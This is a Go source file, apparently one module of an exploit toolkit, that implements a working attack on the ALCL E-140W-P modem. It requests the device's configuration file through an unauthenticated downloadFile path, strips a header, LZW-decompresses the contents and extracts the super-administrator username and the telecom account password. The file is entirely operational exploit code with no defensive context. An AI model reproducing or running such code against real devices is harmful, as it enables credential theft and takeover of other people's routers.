package exp

import (
	"bytes"
	"encoding/xml"
	"errors"
	"fmt"
	"golang.org/x/image/tiff/lzw"
	"io/ioutil"
	"net/http"
	"regexp"
)

type modemConfig struct {
	LoginCfgAdminUserName  string `xml:"InternetGatewayDevice>X_BROADCOM_COM_LoginCfg>AdminUserName"`
	TeleComAccountPassword string `xml:"InternetGatewayDevice>DeviceInfo>X_CT-COM_TeleComAccount>Password"`
}

func parseModemConfig(data []byte) (*Result, error) {
	var modemConfig modemConfig

	// TRICKY: modem has invalid xml tag starts with number, replace it to valid one
	re := regexp.MustCompile("<(/?)([0-9]+)")
	s := re.ReplaceAllString(string(data), "<${1}fxxk${2}")

	err := xml.Unmarshal([]byte(s), &modemConfig)
	if err != nil {
		return nil, err
	}
	return &Result{
		Username: modemConfig.LoginCfgAdminUserName,
		Password: modemConfig.TeleComAccountPassword,
		Config:   data,
	}, nil
}

func ALCL_E_140W_P() *Exp {
	return &Exp{
		Name: "ALCL E-140W-P downloadFile?file=/var/config/psi",
		Handle: func(context Context) (*Result, error) {
			context.Log("下载配置文件 /var/config/psi")
			response, err := http.Get(fmt.Sprintf("http://%s/downloadFile?file=/var/config/psi", context.GetHost()))
			if err != nil {
				return nil, err
			}
			if response.StatusCode != 200 {
				return nil, errors.New(fmt.Sprintf("请求失败, 状态码: %d", response.StatusCode))
			}

			encryptData, err := ioutil.ReadAll(response.Body)
			if err != nil {
				return nil, err
			}

			if len(encryptData) < 0x3C {
				return nil, errors.New("配置文件不合法")
			}
			// ignore leading 0x3C bytes
			encryptData = encryptData[0x3C:]

			context.Log("解码配置文件")
			// lzw decompress
			reader := lzw.NewReader(bytes.NewReader(encryptData), lzw.MSB, 8)
			data, err := ioutil.ReadAll(reader)
			if err != nil {
				return nil, err
			}

			context.Log("解析超级管理员账号和密码")
			result, err := parseModemConfig(data)
			if err != nil {
				return nil, err
			}

			return result, nil
		},
	}
}
